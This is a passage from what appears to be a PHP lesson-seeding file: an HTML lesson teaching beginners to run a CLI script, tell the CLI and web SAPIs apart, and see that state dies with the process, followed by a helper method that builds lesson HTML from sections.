<p class="lead">Stage 0 · Foundations · PHP 8.x</p>

<p>Reading about execution chains is not the same as watching one happen. In this lesson you run your first script from the terminal and feel two facts that will matter for the rest of the course: PHP has more than one environment (SAPI), and a process remembers nothing after it exits.</p>

<h2>The loop you are about to build</h2>
<p>Write a file, run it, read the output, change one line, run it again. That tight loop is how every PHP developer — senior included — explores unfamiliar code. Open a terminal in this project and create <code>hello.php</code>:</p>
<pre><code class="language-php">&lt;?php
echo 'Hello from CLI' . PHP_EOL;</code></pre>
<p>Run it with <code>php hello.php</code>. The text appears, the process exits, and the terminal prompt returns — nothing is left running. Notice the use of <code>PHP_EOL</code> instead of <code>"\n"</code>: it is the platform-correct newline, so the same script prints properly on Windows and Linux.</p>

<h2>Two environments, one language</h2>
<p>The same file behaves differently depending on who runs it. In the <strong>CLI</strong> SAPI your script starts, prints to stdout, and terminates. Under the <strong>web</strong> SAPI (Apache/Nginx → PHP-FPM), a request comes in, your script runs against that request’s <code>$_GET</code>/<code>$_POST</code>/session, sends a response, and the process goes back to waiting for the next request. You will never see <code>echo</code> land in a terminal in web mode — it goes into the HTTP response body.</p>

<h2>State dies with the process</h2>
<p>Try this: define a variable, exit the script, start a new run, and read the variable. It is gone. Nothing survives between CLI runs, and nothing survives between two web requests unless you <em>store</em> it somewhere shared — a database, a cache, or a session. This single fact is why sessions, cookies, and databases exist, and it is the seed of every “why is my variable null?” bug you will debug later.</p>

<h3>Where beginners get stuck</h3>
<ul>
  <li>Running <code>hello.php</code> without <code>php</code> in front of it (or vice versa)</li>
  <li>Expecting one run to remember the previous run</li>
  <li>Confusing “printed to the terminal” with “written to a file” — <code>echo</code> never creates files</li>
</ul>

<h2>Practice it out loud</h2>
<p>Write a second script that prints the current date, run it twice a minute apart, and explain why the output changed even though nothing was saved. Then answer: where would you have to store a value so the <em>next</em> run could see it?</p>

<h2>Interview drill</h2>
<ol>
  <li>What is a SAPI, and name the two you have used?</li>
  <li>Why does a variable vanish when a CLI script exits?</li>
  <li>Where does <code>echo</code> output go in web mode versus CLI mode?</li>
</ol>
HTML;
    }

    /**
     * Build lesson HTML as connected narrative sections.
     *
     * Sections are statement-style headings with multi-sentence prose —
     * never question headings. Block content (pre/ul/table/…) is passed
     * through untouched; plain text is wrapped in a paragraph.
     *
     * @param  list<array{0: string, 1: string}>  $sections
     */
    private function body(string $title, string $lead, array $sections): string
    {
        $html = '<h1>'.$title.'</h1><p class="lead">'.$lead.'</p>';

        foreach ($sections as $index => [$heading, $content]) {
            $tag = $index === 0 ? 'h2' : 'h3';
            $html .= '<'.$tag.'>'.$heading.'</'.$tag.'>';
            $html .= preg_match('/^\s*<(pre|ul|ol|table|blockquote|div|p|h\d)/', $content)
                ? $content
                : '<p>'.$content.'</p>';
        }

        return $html;
    }
}
